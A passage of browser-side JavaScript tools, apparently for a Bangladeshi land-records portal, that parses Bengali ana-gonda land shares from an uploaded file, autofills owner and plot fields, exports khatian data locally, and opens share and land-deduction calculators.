                i.onchange = e => {
                    let f = e.target.files[0]; if (!f) return; let r = new FileReader();
                    r.onload = async function(ev) {
                        let t = ev.target.result, ls = t.split('\n').map(l => l.trim()).filter(l => l); let es = [], ps = [], pSh = [];
                        ls.forEach(l => {
                            let bt = s => s.replace(/[০-৯]/g, d => "০১২৩৪৫৬৭৮৯".indexOf(d)); let m = l.match(/[৵৶।॥৲৷১/০-৯0-9\s৸⁄৷৷/८]+$/); let ss = "";
                            if (m) {
                                let cStr = m[0].trim().replace(/[\s८]+/g, '_').replace(/^_+/, ''); let ana = 0, gonda = 0, kora = 0, kranti = 0, til = 0;
                                let m1 = cStr.match(/^([^০-৯0-9_]+)/);
                                if (m1) { let x = m1[1]; let aMap = { '১': 16, '৸৶': 15, '৸৵': 14, '৸/': 13, '৸⁄': 13, '৸': 12, '৷৷৶': 11, '।।৶': 11, '॥৶': 11, '৷৷৵': 10, '।।৵': 10, '॥৵': 10, '৷৷/': 9, '।।/': 9, '॥/': 9, '৷৷⁄': 9, '।।⁄': 9, '॥⁄': 9, '৷৷': 8, '।।': 8, '॥': 8, '৷৶': 7, '।৶': 7, '৷৵': 6, '।৵': 6, '৷/': 5, '।/': 5, '৷⁄': 5, '।⁄': 5, '৷': 4, '।': 4, '৶': 3, '৵': 2, '/': 1, '⁄': 1 }; let found = Object.keys(aMap).sort((a, b) => b.length - a.length).find(k => x.startsWith(k)); if (found) { ana = aMap[found]; cStr = cStr.substring(found.length) } }
                                cStr = cStr.replace(/^_+/, ''); let m2 = cStr.match(/^([০-৯0-9]+)/); if (m2) { gonda = parseInt(bt(m2[1])); cStr = cStr.substring(m2[0].length) }
                                cStr = cStr.replace(/^_+/, ''); let m3 = cStr.match(/^([^০-৯0-9]+)/);
                                if (m3) { let x = m3[1]; if (x.startsWith('৸') || x.startsWith('৶')) { kora = 3; x = x.substring(1) } else if (x.startsWith('৷৷') || x.startsWith('।।') || x.startsWith('॥')) { kora = 2; x = x.substring(2) } else if (x.startsWith('৷') || x.startsWith('।')) { kora = 1; x = x.substring(1) } if (x.includes('//') || x.includes('৷৷') || x.includes('।।') || x.includes('॥')) kranti = 2; else if (x.includes('/') || x.includes('৷') || x.includes('।') || x.includes('⁄')) kranti = 1; cStr = cStr.substring(m3[0].length) }
                                cStr = cStr.replace(/^_+/, ''); let m4 = cStr.match(/^([০-৯0-9]+)/); if (m4) til = parseInt(bt(m4[1]));
                                let n = (ana / 16) + (gonda / 320) + (kora / 1280) + (kranti / 3840) + (til / 76800);
                                if (n > 0) ss = n.toFixed(6).replace(/0+$/, '').replace(/\.$/, '')
                            }
                            let c = l.replace(/[৵৶।॥৲৷১/০-৯0-9\s৸⁄৷৷/८]+$/, "").trim();
                            if (c !== "") {
                                if (c.includes("সাং") || c.includes("ঠিকানা")) { let ad = c.replace(/(সাং|ঠিকানা)[:\s]*/, "").trim(); ps.forEach(p => { p.address = ad; es.push(p) }); ps = [] } else if (c.includes("পিং") || c.includes("জং") || c.includes("জঃ")) { let rel = c.replace(/(পিং|জং|জঃ)[:\s]*/, "").trim(); for (let j = ps.length - 1; j >= 0; j--) { if (ps[j].father === "") { ps[j].father = rel; if (ss) ps[j].share = ss } else break } } else ps.push({ name: c, father: "", address: "", share: ss })
                            } else { if (ss) pSh.push(ss) }
                        });
                        if (ps.length > 0) { let la = es.length > 0 ? es[es.length - 1].address : "নিজ"; ps.forEach(p => { p.address = p.address || la; es.push(p) }) }
                        for (let i = 0; i < es.length; i++) { if (!es[i].share && pSh.length > 0) es[i].share = pSh.shift() }
                        let totalSum = 0; es.forEach(d => { if (d.share) totalSum += parseFloat(d.share) }); totalSum = Math.round(totalSum * 1000000) / 1000000; let proceed = false;
                        if (Math.abs(totalSum - 1.0) <= 0.000010) { proceed = confirm("✅ পারফেক্ট! মোট ১৬ আনা মিলেছে (১.০০০০০০)।\n\nআপনি কি পোর্টালে ডাটা এন্ট্রি শুরু করবেন?"); } else { let diff = (1.0 - totalSum).toFixed(6); if (totalSum < 1.0) { proceed = confirm("⚠️ এলার্ট: অংশে ঘাটতি আছে!\nমোট যোগফল: " + totalSum.toFixed(6) + "\nশর্ট আছে: " + diff + "\n\nতবুও কি ডাটা এন্ট্রি শুরু করবেন?"); } else { proceed = confirm("⚠️ এলার্ট: অংশ ১৬ আনার বেশি!\nমোট যোগফল: " + totalSum.toFixed(6) + "\nঅতিরিক্ত: " + Math.abs(diff).toFixed(6) + "\n\nতবুও কি ডাটা এন্ট্রি শুরু করবেন?"); } }
                        if (!proceed) return;
                        for (let d of es) {
                            let b = Array.from(document.querySelectorAll('button')).find(x => x.innerText.includes('লিখে এন্ট্রি')); if (b) b.click(); await new Promise(r => setTimeout(r, 1800));
                            let ins = Array.from(document.querySelectorAll('input:not([type="hidden"]),textarea')); let nF = ins.find(el => (el.placeholder || "").includes("নাম") && !((el.placeholder || "").includes("পিতা"))); if (nF) { nF.value = d.name; nF.dispatchEvent(new Event('input', { bubbles: true })) }
                            let fF = ins.find(el => (el.placeholder || "").includes("পিতা") || (el.placeholder || "").includes("স্বামী")); if (fF) { fF.value = d.father; fF.dispatchEvent(new Event('input', { bubbles: true })) }
                            let aF = ins.find(el => (el.placeholder || "").includes("ঠিকানা")); if (aF) { aF.value = d.address; aF.dispatchEvent(new Event('input', { bubbles: true })) }
                            await new Promise(r => setTimeout(r, 1000));
                            let bA = Array.from(document.querySelectorAll('button')).find(x => x.innerText.trim() === 'এন্ট্রি করুন'); if (bA) bA.click(); await new Promise(r => setTimeout(r, 2200));
                            let sFs = Array.from(document.querySelectorAll('input')).filter(el => (el.placeholder || "").includes("অংশ") && el.offsetParent !== null); let sF = sFs[sFs.length - 1]; if (sF && d.share) { sF.value = d.share; sF.dispatchEvent(new Event('input', { bubbles: true })) }
                            await new Promise(r => setTimeout(r, 1200))
                        }
                        alert("আনা-গন্ডা মাস্টার আপডেট ডান!")
                    }; r.readAsText(f);
                }; i.click()
            },
            t6: function() {
                let p = prompt("কয়টি দাগ যোগ?"); if (!p) return; let cl = p.replace(/[০-৯]/g, d => "০১২৩৪৫৬৭৮৯".indexOf(d)).trim();
                if (!/^\d+$/.test(cl)) { alert("ভুল ইনপুট!"); return; } let c = parseInt(cl); let b = document.getElementById('PlusItem22');
                if (b && c > 0) { let i = 0; function hc() { if (i < c) { b.click(); i++; setTimeout(hc, Math.floor(Math.random() * 500) + 500); } } hc(); }
            },
            
            // ==========================================
            // Updated Tool 7 (Dager Tottho) - Your Logic
            // ==========================================
            t7: function() {
                let dStr=prompt("দাগ নং গুলো দিন (কমা দিয়ে):");
                let aStr=prompt("পরিমাণ (শতক) দিন (কমা দিয়ে):");
                let cStr=prompt("রেকর্ডীয় শ্রেণী দিন (কমা দিয়ে):");
                if(!dStr||!aStr||!cStr)return;
                
                let dags=dStr.split(',').map(s=>s.trim());
                let amts=aStr.split(',').map(s=>s.trim());
                let clss=cStr.split(',').map(s=>s.trim());
                let totalUpdated=0;
                
                function solve(win){
                    try{
                        let dagFields=Array.from(win.document.querySelectorAll('.r2Dag_no'));
                        if(dagFields.length>0){
                            dagFields.forEach((field,index)=>{
                                let row=field;
                                for(let i=0;i<5;i++){
                                    if(row.parentElement&&(row.querySelectorAll('.r2Amount_of_land').length>=1||row.querySelectorAll('.r2amount_of_landDag').length>=1)){
                                        if(row.querySelectorAll('.r2UsableLandType').length>0)break
                                    }
                                    row=row.parentElement
                                }
                                field.value=dags[index]||dags[dags.length-1];
                                field.dispatchEvent(new Event('input',{bubbles:true}));
                                let amtVal=amts[index]||amts[amts.length-1];
                                let amtFields=row.querySelectorAll('.r2amount_of_landDag, .r2Amount_of_land');
                                amtFields.forEach(af=>{
                                    af.value=amtVal;
                                    af.dispatchEvent(new Event('input',{bubbles:true}));
                                    af.style.backgroundColor="#e1f5fe"
                                });
                                let selects=Array.from(row.querySelectorAll('select'));
                                if(selects.length>=2){
                                    let recTxt=clss[index]||clss[clss.length-1];
                                    updateS2(win,selects.find(s=>!s.classList.contains('r2UsableLandType'))||selects[0],recTxt);
                                    updateS2(win,row.querySelector('.r2UsableLandType')||selects[1],'কৃষি')
                                }
                                totalUpdated++
                            });
                            return true
                        }
                        for(let j=0;j<win.frames.length;j++){
                            if(solve(win.frames[j]))return true
                        }
                    }catch(e){}
                    return false
                }
                function updateS2(w,el,txt){
                    if(!el)return;
                    let options=Array.from(el.options);
                    let target=options.find(opt=>opt.text.trim()===txt.trim())||options.find(opt=>opt.text.includes(txt.trim()));
                    if(target){
                        el.value=target.value;
                        el.dispatchEvent(new Event('change',{bubbles:true}));
                        if(w.jQuery){
                            let $el=w.jQuery(el);
                            $el.val(target.value).trigger('change');
                            if($el.data('select2')){
                                $el.trigger('select2:select')
                            }
                        }
                    }
                }
                solve(window);
                if(totalUpdated>0){
                    alert(totalUpdated+" টি সারির সব ঘর (দাগ, ২টা পরিমাণ ও শ্রেণী) আপডেট হয়েছে!");
                }else{
                    alert("কোনো ঘর পাওয়া যায়নি ভাই! পেজ রিফ্রেশ করে আবার চেষ্টা করুন।");
                }
            },
            
            t8: function() {
                let rs = document.querySelectorAll('table tr'); let o = [];
                rs.forEach(r => { let c = r.querySelectorAll('td'); if (c.length > 1) { let n = c[0].innerText.trim(); let s = c[1].innerText.trim(); if (n && n !== '১' && !n.includes('মালিক, অকৃষি')) o.push(n + '   ' + s); } });
                let rt = o.join('\n\n'); if (rt === '') { alert('ডাটা পাইনি!'); return; } let bt = document.body.innerText; let km = bt.match(/খতি[য়য়]ান\s*নং[^\d০-৯]*([০-৯0-9]+)/); let fn = (km ? km[1] : 'khatian_data') + '.txt';
                if (confirm('"' + fn + '" সেভ করবি?')) { let bl = new Blob([rt], { type: 'text/plain;charset=utf-8' }); let lk = document.createElement('a'); lk.href = URL.createObjectURL(bl); lk.download = fn; document.body.appendChild(lk); lk.click(); document.body.removeChild(lk); }
            },
            t9: function() {
                if (document.getElementById('floating-calc-final-master')) return; const st = document.createElement('style');
                st.innerHTML = "#floating-calc-final-master{position:fixed;top:10px;left:10px;width:380px;height:90vh;background:rgba(255,255,255,0.95);backdrop-filter:blur(16px);border-radius:16px;z-index:999999;box-shadow:0 25px 50px rgba(0,0,0,0.2);display:flex;flex-direction:column;overflow:hidden;font-family:'Segoe UI',Arial,sans-serif;border:1px solid rgba(255,255,255,0.5);} .fcm-h{background:linear-gradient(135deg,#1e293b 0%,#0f172a 100%);color:#fff;padding:16px;text-align:center;font-weight:800;display:flex;justify-content:space-between;align-items:center;} .fcm-b{padding:20px;overflow-y:auto;flex-grow:1;background:rgba(248,250,252,0.5);} .oc{background:#fff;border:1px solid #e2e8f0;padding:15px;border-radius:12px;margin-bottom:15px;position:relative;box-shadow:0 4px 6px -1px rgba(0,0,0,0.05);transition:all 0.2s;} .oc:focus-within{border-color:#3b82f6;box-shadow:0 0 0 3px rgba(59,130,246,0.15);} .fcm-b select:focus{border-color:#3b82f6!important;outline:none!important;background:#eff6ff!important;} .gi{display:grid;grid-template-columns:repeat(2,1fr);gap:10px} .lt{font-weight:700;font-size:11px;color:#64748b;text-transform:uppercase;margin-bottom:4px;display:block;letter-spacing:0.5px;} .fcm-b select{width:100%;padding:10px;border:1px solid #cbd5e1;border-radius:8px;font-size:14px;background:#fff;color:#0f172a;font-weight:600;transition:all 0.2s;} .fb{padding:15px;background:#fff;border-top:1px solid #e2e8f0;display:grid;grid-template-columns:1.2fr 1fr;gap:10px} .vmt-btn{padding:12px;border:none;border-radius:10px;cursor:pointer;color:white;font-weight:800;font-size:13px;transition:all 0.2s;} .ab{background:#10b981;box-shadow:0 4px 0 #059669;} .ab:active{transform:translateY(4px);box-shadow:none;} .cb{background:#3b82f6;box-shadow:0 4px 0 #2563eb;} .cb:active{transform:translateY(4px);box-shadow:none;} .fib{background:linear-gradient(135deg,#ef4444,#dc2626);width:100%;margin-top:12px;box-shadow:0 4px 10px rgba(239,68,68,0.3);} .act{position:absolute;top:12px;right:12px;display:flex;gap:12px;align-items:center} .cpt{cursor:pointer;font-size:11px;font-weight:800;color:#10b981;} .al{cursor:pointer;font-weight:900;font-size:18px;line-height:1;} #ra{margin:10px 20px;padding:15px;border-radius:12px;display:none;font-weight:800;text-align:center;border:1px solid #e2e8f0;box-shadow:inset 0 2px 4px rgba(0,0,0,0.05);} .gh{color:#ef4444;display:block;font-size:16px;margin-top:6px;font-weight:900;} .fcm-footer{padding:12px;background:rgba(255,255,255,0.9);border-top:1px solid #e2e8f0;text-align:center}";
                document.head.appendChild(st);
                const tB = n => n.toString().replace(/\d/g, d => "০১২৩৪৫৬৭৮৯"[d]); const tE = s => s.toString().replace(/[০-৯]/g, d => "০১২৩৪৫৬৭৮৯".indexOf(d));
                function fG(gv) {
                    let r = Math.abs(gv) * 16; let a = Math.floor(r + 1e-9); r = (r - a) * 20; let g = Math.floor(r + 1e-9); r = (r - g) * 4; let k = Math.floor(r + 1e-9); r = (r - k) * 3; let kr = Math.floor(r + 1e-9); r = (r - kr) * 20; let t = Math.round(r);
                    if (t >= 20) { t -= 20; kr += 1; } if (kr >= 3) { kr -= 3; k += 1; } if (k >= 4) { k -= 4; g += 1; } if (g >= 20) { g -= 20; a += 1; }
                    let p = []; if (a > 0) p.push(tB(a) + " আনা"); if (g > 0) p.push(tB(g) + " গণ্ডা"); if (k > 0) p.push(tB(k) + " কড়া"); if (kr > 0) p.push(tB(kr) + " ক্রান্তি"); if (t > 0) p.push(tB(t) + " তিল"); return p.length > 0 ? p.join(' ') : "০ তিল";
                }
                const co = document.createElement('div'); co.id = 'floating-calc-final-master'; co.innerHTML = '<div class="fcm-h"><span>🧮 স্মার্ট হিস্যা ক্যালকুলেটর</span><button onclick="this.closest(\'#floating-calc-final-master\').remove()" style="background:none;border:none;color:#94a3b8;cursor:pointer;font-size:24px;font-weight:bold;line-height:1;">&times;</button></div><div class="fcm-b" id="lst"></div><div id="ra"></div><div class="fb"><button class="vmt-btn ab" id="ae">+ মালিক যোগ</button><button class="vmt-btn cb" id="gc">ফলাফল দেখুন</button></div>'; document.body.appendChild(co);
                function ad(rf, cd) {
                    const d = document.createElement('div'); d.className = 'oc';
                    let aOp = ['০-০', '⁄-১', '৵-২', '৶-৩', '৷-৪', '৷⁄-৫', '৷৵-৬', '৷৶-৭', '৷৷-৮', '৷৷⁄-৯', '৷৷৵-১০', '৷৷৶-১১', '৸-১২', '৸⁄-১৩', '৸৵-১৪', '৸৶-১৫', '১-১৬'].map((s, i) => '<option value="' + i + '">' + s + '</option>').join('');
                    let g19 = Array.from({ length: 19 }, (_, i) => '<option value="' + (i + 1) + '">' + tB(i + 1) + '</option>').join('');
                    d.innerHTML = '<div style="margin-bottom:12px"><b class="ttl" style="color:#3b82f6;font-size:14px;font-weight:800;"></b><div class="act"><span class="cpt">কপি</span><span class="al ib" style="color:#10b981">+</span><span class="al db" style="color:#ef4444">&times;</span></div></div><div class="gi"><div><label class="lt">আনা</label><select class="sa">' + aOp + '</select></div><div><label class="lt">গণ্ডা</label><select class="sg"><option value="0">০</option>' + g19 + '</select></div><div><label class="lt">কড়া</label><select class="sk"><option value="0">০</option><option value="1">১</option><option value="2">২</option><option value="3">৩</option></select></div><div><label class="lt">ক্রান্তি</label><select class="skr"><option value="0">০</option><option value="1">১</option><option value="2">২</option></select></div><div style="grid-column:span 2"><label class="lt">তিল</label><select class="st"><option value="0">০</option>' + g19 + '</select></div></div>';
                    d.querySelectorAll('select').forEach(sel => { sel.buf = ""; sel.timer = null; sel.onkeydown = function(e) { let k = tE(e.key); if (e.key === 'Enter') { e.preventDefault(); document.getElementById('gc').click(); return; } if (!isNaN(k)) { e.preventDefault(); clearTimeout(this.timer); this.buf += k; let opt = Array.from(this.options).find(o => o.value == this.buf); if (opt) this.value = this.buf; else { this.buf = k; this.value = k; } this.dispatchEvent(new Event('change', { bubbles: true })); this.timer = setTimeout(() => { this.buf = ""; }, 500); } }; });
                    d.querySelector('.cpt').onclick = () => { ad(d, { a: d.querySelector('.sa').value, g: d.querySelector('.sg').value, k: d.querySelector('.sk').value, kr: d.querySelector('.skr').value, t: d.querySelector('.st').value }); }; d.querySelector('.ib').onclick = () => ad(d); d.querySelector('.db').onclick = () => { d.remove(); rn(); };
                    if (rf) rf.after(d); else document.getElementById('lst').appendChild(d);
                    if (cd) { d.querySelector('.sa').value = cd.a; d.querySelector('.sg').value = cd.g; d.querySelector('.sk').value = cd.k; d.querySelector('.skr').value = cd.kr; d.querySelector('.st').value = cd.t; } rn(); setTimeout(() => { d.querySelector('.sa').focus(); }, 10);
                }
                function rn() { document.querySelectorAll('.oc').forEach((c, i) => { c.querySelector('.ttl').innerText = "মালিক " + tB(i + 1); }); } document.getElementById('ae').onclick = () => ad();
                document.getElementById('gc').onclick = function() {
                    let sm = 0; document.querySelectorAll('.oc').forEach(c => { let a = parseInt(c.querySelector('.sa').value) || 0, g = parseInt(c.querySelector('.sg').value) || 0, k = parseInt(c.querySelector('.sk').value) || 0, kr = parseInt(c.querySelector('.skr').value) || 0, t = parseInt(c.querySelector('.st').value) || 0; sm += (a / 16) + (g / 320) + (k / 1280) + (kr / 3840) + (t / 76800); });
                    const r = document.getElementById('ra'); let df = 1.0 - sm; r.style.display = 'block';
                    if (Math.abs(df) < 0.000001) { r.innerHTML = '<span style="font-size:20px;">✅</span><br>১৬ আনা মিলেছে!<button class="vmt-btn fib" id="af">পোর্টালে বসান</button>'; r.style.background = "#ecfdf5"; r.style.borderColor = "#a7f3d0"; r.style.color = "#059669"; document.getElementById('af').onclick = () => fp(); fp(); } else { let st = df > 0 ? "হিস্যা শর্ট আছে!" : "হিস্যা অতিরিক্ত!"; r.innerHTML = '<span style="font-size:20px;">⚠️</span><br>' + st + '<br><span class="gh">' + (df > 0 ? "আরও" : "") + ' ' + fG(df) + ' ' + (df > 0 ? "প্রয়োজন" : "বেশি") + '</span>'; r.style.background = "#fef2f2"; r.style.borderColor = "#fecaca"; r.style.color = "#dc2626"; }
                };
                function fp() { let fs = []; document.querySelectorAll('input').forEach(el => { if ((el.placeholder || "").includes("অংশ") || (el.name || "").includes("percentage") || (el.className || "").includes("land-portion") || (el.getAttribute('id') || "").includes("portion")) fs.push(el); }); document.querySelectorAll('.oc').forEach((c, i) => { let a = parseInt(c.querySelector('.sa').value) || 0, g = parseInt(c.querySelector('.sg').value) || 0, k = parseInt(c.querySelector('.sk').value) || 0, kr = parseInt(c.querySelector('.skr').value) || 0, t = parseInt(c.querySelector('.st').value) || 0; let sh = (a / 16) + (g / 320) + (k / 1280) + (kr / 3840) + (t / 76800); if (fs[i]) { fs[i].value = sh.toFixed(6); fs[i].dispatchEvent(new Event('input', { bubbles: true })); } }); document.getElementById('floating-calc-final-master').remove(); } ad();
            },
            
            t10: function() {
                let calcWin = window.open('', 'LandDeductionPro', 'width=1150,height=750,left=100,top=100');
                if (!calcWin) {
                    alert('আপনার ব্রাউজার পপ-আপ ব্লক করেছে! অনুগ্রহ করে এড্রেস বারের ডান পাশ থেকে পপ-আপ অ্যালাউ (Allow Pop-ups) করে আবার চেষ্টা করুন।');
                    return;
                }
                
                let calcCode = `<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>জমি বাদের হিসাব ক্যালকুলেটর PRO</title>
    <style>
        :root { --bg-color: #f8fafc; --card-bg: #ffffff; --primary: #1e3a8a; --success: #10b981; --danger: #ef4444; --text-dark: #0f172a; --border-color: #e2e8f0; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: var(--bg-color); color: var(--text-dark); margin: 0; padding: 20px; display: flex; justify-content: center; }
        .container { width: 100%; max-width: 1100px; background: var(--card-bg); border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); padding: 25px; overflow-x: auto; border-top: 5px solid #1e3a8a; }
        h2 { text-align: center; color: var(--primary); margin-top: 0; border-bottom: 2px solid #f1f5f9; padding-bottom: 15px; font-weight:900; }
        table { width: 100%; border-collapse: collapse; margin-bottom: 20px; min-width: 950px; }
        th, td { border: 1px solid var(--border-color); padding: 10px; text-align: center; vertical-align: middle; }
        th { background: #f1f5f9; color: var(--text-dark); font-size: 14px; }
        .serial-no { font-weight: bold; color: #64748b; }
        .std-input { width: 90%; padding: 8px; border: 1px solid #cbd5e1; border-radius: 6px; font-size: 14px; text-align: center; transition: all 0.3s ease; }
        .std-input:focus, .deduction-input:focus, .quick-input:focus { border: 2px solid #3b82f6; background-color: #eff6ff; outline: none; box-shadow: 0 0 8px rgba(59, 130, 246, 0.2); }
        .btn, .add-box-btn, .copy-btn-sm, .btn-remove { background: linear-gradient(145deg, #f8fafc, #f1f5f9); border: 1px solid #cbd5e1; border-radius: 10px; color: var(--text-dark); font-weight: bold; cursor: pointer; transition: all 0.3s ease; display: flex; align-items: center; justify-content: center; }
        .btn-add { color: #1e3a8a; margin-bottom: 15px; padding: 10px 15px;}
        .btn-reset { color: var(--danger); margin-bottom: 15px; padding: 10px 15px;}
        .btn-remove { color: var(--danger); padding: 6px; width: 35px; margin: 0 auto;}
        .deduction-wrapper { display: flex; flex-wrap: wrap; gap: 5px; align-items: center; justify-content: center; }
        .deduction-input { width: 55px; padding: 6px; border: 1px solid #cbd5e1; border-radius: 4px; text-align: center; }
        .remaining-land { font-weight: bold; font-size: 16px; color: var(--success); }
        .footer-total { background: #f8fafc; padding: 20px; border-radius: 12px; border: 1px solid #e2e8f0; margin-bottom: 20px; }
        .total-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; font-size: 1.2rem; color: #1e3a8a; }
        .copy-actions { display: flex; flex-wrap: wrap; gap: 10px; justify-content: center; }
        .copy-actions .btn { flex: 1; min-width: 200px; padding: 12px; background:linear-gradient(135deg, #3b82f6, #1e3a8a); color:white; border:none;}
        .quick-action-box { background: #eff6ff; padding: 15px; border-radius: 8px; margin-bottom: 15px; display: flex; gap: 15px; align-items: center; border: 1px solid #bfdbfe; }
        .quick-input { padding: 8px; border: 1px solid #cbd5e1; border-radius: 6px; font-size: 14px; text-align: center; width: 120px; }
    </style>
</head>
<body>
<div class="container">
    <h2>দাগ ভিত্তিক জমি বাদের হিসাব (স্মার্ট বক্স ম্যানেজমেন্ট)</h2>
    <div class="quick-action-box">
        <strong style="color: #1e3a8a;">⚡ দ্রুত জমি বাদ:</strong>
        <input type="text" id="quick-dag" class="quick-input" placeholder="দাগ নং লিখুন" onkeydown="moveToNextQuick(event, 'quick-amount')">
        <input type="text" id="quick-amount" class="quick-input" placeholder="কত বাদ যাবে?" onkeydown="triggerQuickAdd(event)">
        <button class="btn btn-add" style="margin-bottom: 0; padding: 8px 15px;" onclick="applyQuickDeduction()">যুক্ত করুন</button>
        <span id="quick-msg" style="font-weight: bold; font-size: 14px; transition: opacity 0.3s;"></span>
    </div>
    <div style="display: flex; gap: 10px; justify-content: space-between; align-items: center;">
        <div style="display: flex; gap: 10px;">
            <button class="btn btn-add" onclick="addRow()">+ নতুন দাগ</button>
            <button class="btn btn-add" style="color: #3b82f6;" onclick="importDags()">+ দাগ, শ্রেণি ও জমি ইমপোর্ট</button>
        </div>
        <button class="btn btn-reset" onclick="resetAll()">🔄 রিসেট</button>
    </div>
    <table>
        <thead>
            <tr>
                <th width="5%">ক্র.নং</th>
                <th width="10%">দাগ নং</th>
                <th width="12%">শ্রেণি</th>
                <th width="10%">মোট জমি</th>
                <th width="40%">বাদ দেওয়া জমি</th>
                <th width="15%">অবशिष्ट জমি</th>
                <th width="8%">মুছুন</th>
            </tr>
        </thead>
        <tbody id="table-body"></tbody>
    </table>
    <div class="footer-total">
        <div class="total-row">
            <span style="font-weight: bold;">সর্বমোট অবশিষ্ট জমি:</span>
            <span id="grand-total" style="font-size: 24px; font-weight: 900;">০.০০</span>
        </div>
        <div class="copy-actions">
            <button id="btn-copy-dag" class="btn" onclick="copyAllDags()">সব দাগ নং কপি</button>
            <button id="btn-copy-land" class="btn" onclick="copyAllRemaining()">সব অবশিষ্ট জমি কপি</button>
            <button id="btn-copy-shreni" class="btn" style="background:linear-gradient(135deg, #10b981, #059669);" onclick="copyAllShreni()">সব শ্রেণি কপি</button>
        </div>
    </div>
    
    <div class="dev-footer" style="background: linear-gradient(145deg, #f8f9fa, #e9ecef); border-radius: 12px; text-align: center; padding: 20px; border: 1px solid #e2e8f0; box-shadow: inset 0 2px 4px rgba(0,0,0,0.02);">
        <span style="font-size: 10px; color: #64748b; text-transform: uppercase; letter-spacing: 2px; font-weight: 700;">Proudly Developed By</span><br>
        <span style="font-size: 22px; font-weight: 900; color: #0f172a; letter-spacing: 1.5px; display: inline-block; margin: 5px 0;">TRUST SHOP</span><br>
        <span style="font-size: 11px; color: #94a3b8; text-transform: uppercase; letter-spacing: 3px; font-weight: 600;">Premium Digital Solutions</span>
    </div>
</div>
<script>
    function convertToEnglish(str) {
        if (!str) return "";
        const bngToEng = {'০':'0', '১':'1', '২':'2', '৩':'3', '৪':'4', '৫':'5', '৬':'6', '৭':'7', '৮':'8', '৯':'9'};
        let eng = str.toString().replace(/[০-৯]/g, match => bngToEng[match]);
        return eng;
    }
    function toBengaliNumber(num) {
        if(num === undefined || num === null) return "০.০০";
        let str = num.toString();
        let isNegative = false;
        if (str.startsWith('-')) { isNegative = true; str = str.substring(1); }
        const bngDigits = ['০','১','২','৩','৪','৫','৬','৭','৮','৯'];
        let result = str.split('').map(d => bngDigits[d] || d).join('');
        return isNegative ? '-' + result : result;
    }
    function updateSerialNumbers() {
        const rows = document.querySelectorAll('#table-body tr');
        rows.forEach((row, index) => { row.querySelector('.serial-no').innerText = toBengaliNumber(index + 1); });
    }
    function handleVerticalEnter(e, inputElement, className) {
        if (e.key === 'Enter') {
            e.preventDefault();
            const currentRow = inputElement.closest('tr');
            let nextRow = currentRow.nextElementSibling;
            if (!nextRow) { addRow(); nextRow = currentRow.nextElementSibling; }
            if (nextRow) { const nextInput = nextRow.querySelector('.' + className); if (nextInput) nextInput.focus(); }
        }
    }
    function moveToNextQuick(e, nextId) { if (e.key === 'Enter') { e.preventDefault(); document.getElementById(nextId).focus(); } }
    function triggerQuickAdd(e) { if (e.key === 'Enter') { e.preventDefault(); applyQuickDeduction(); } }
    function applyQuickDeduction() {
        const dagInput = document.getElementById('quick-dag'); const amountInput = document.getElementById('quick-amount'); const msgSpan = document.getElementById('quick-msg');
        const targetDag = convertToEnglish(dagInput.value.trim()); const amount = convertToEnglish(amountInput.value.trim());
        if (!targetDag || !amount) { msgSpan.innerText = "দাগ নং এবং পরিমাণ দিন!"; msgSpan.style.color = "#e74c3c"; setTimeout(() => msgSpan.innerText = "", 2000); return; }
        const rows = document.querySelectorAll('#table-body tr'); let found = false;
        rows.forEach(row => {
            const rowDag = convertToEnglish(row.querySelector('.dag-input').value.trim());
            if (rowDag === targetDag) {
                found = true; const deductionInputs = row.querySelectorAll('.deduction-input');
                let targetInput = Array.from(deductionInputs).find(input => input.value.trim() === "");
                if (!targetInput) { const btn = row.querySelector('.add-box-btn'); targetInput = addDeductionBox(btn); }
                targetInput.value = toBengaliNumber(amount); checkAndAddExtraBox(row); calculateRow(row.querySelector('.dag-input'));
                row.style.transition = "background-color 0.5s"; row.style.backgroundColor = "#d4edda"; setTimeout(() => row.style.backgroundColor = "", 1500);
            }
        });
        if (found) { msgSpan.innerText = "✓ যোগ হয়েছে!"; msgSpan.style.color = "#10b981"; dagInput.value = ""; amountInput.value = ""; dagInput.focus(); } else { msgSpan.innerText = "দাগ নং খুঁজে পাওয়া যায়নি!"; msgSpan.style.color = "#e74c3c"; }
        setTimeout(() => msgSpan.innerText = "", 2000);
    }
    function handleShreniShortcut(input) {
        const val = input.value.trim();
        const shortcuts = {'1': 'বাড়ী', '১': 'বাড়ী', '2': 'বোরো', '২': 'বোরো', '3': 'বোর', '৩': 'বোর', '4': 'খামা', '৪': 'খামা', '5': 'বর্ষা', '৫': 'বর্ষা', '6': 'চালা', '৬': 'চালা', '7': 'সাইল', '৭': 'সাইল', '8': 'কবরস্থান', '৮': 'কবরস্থান', '9': 'পুকুর', '৯': 'পুকুর'};
        if (shortcuts[val]) input.value = shortcuts[val];
    }
    function addRow(dag = "", shreni = "", total = "") {
        const tbody = document.getElementById('table-body'); const tr = document.createElement('tr');
        tr.innerHTML = \`
            <td class="serial-no"></td>
            <td><input type="text" value="\${dag}" placeholder="দাগ" class="std-input dag-input" onkeydown="handleVerticalEnter(event, this, 'dag-input')"></td>
            <td><input type="text" value="\${shreni}" placeholder="শ্রেণি" class="std-input shreni-input" oninput="handleShreniShortcut(this)" onkeydown="handleVerticalEnter(event, this, 'shreni-input')"></td>
            <td><input type="text" value="\${total}" placeholder="মোট" class="std-input total-land" oninput="calculateRow(this)" onkeydown="handleVerticalEnter(event, this, 'total-land')"></td>
            <td>
                <div class="deduction-wrapper">
                    <input type="text" placeholder="জমি" class="deduction-input" oninput="calculateRow(this)" onkeypress="handleDeductionEnter(event, this)">
                    <input type="text" placeholder="জমি" class="deduction-input" oninput="calculateRow(this)" onkeypress="handleDeductionEnter(event, this)">
                    <input type="text" placeholder="জমি" class="deduction-input" oninput="calculateRow(this)" onkeypress="handleDeductionEnter(event, this)">
                    <input type="text" placeholder="জমি" class="deduction-input" oninput="calculateRow(this)" onkeypress="handleDeductionEnter(event, this)">
                    <button class="add-box-btn" onclick="manualAddBox(this)" style="width:30px; height:30px;">+</button>
                </div>
            </td>
            <td>
                <div style="display: flex; align-items: center; justify-content: center; gap: 5px;">
                    <span class="remaining-land">০.০০</span>
                    <button class="copy-btn-sm" onclick="copyRemaining(this)" style="padding:4px 8px; font-size:11px;">কপি</button>
                </div>
            </td>
            <td><button class="btn-remove" onclick="removeRow(this)">X</button></td>
        \`;
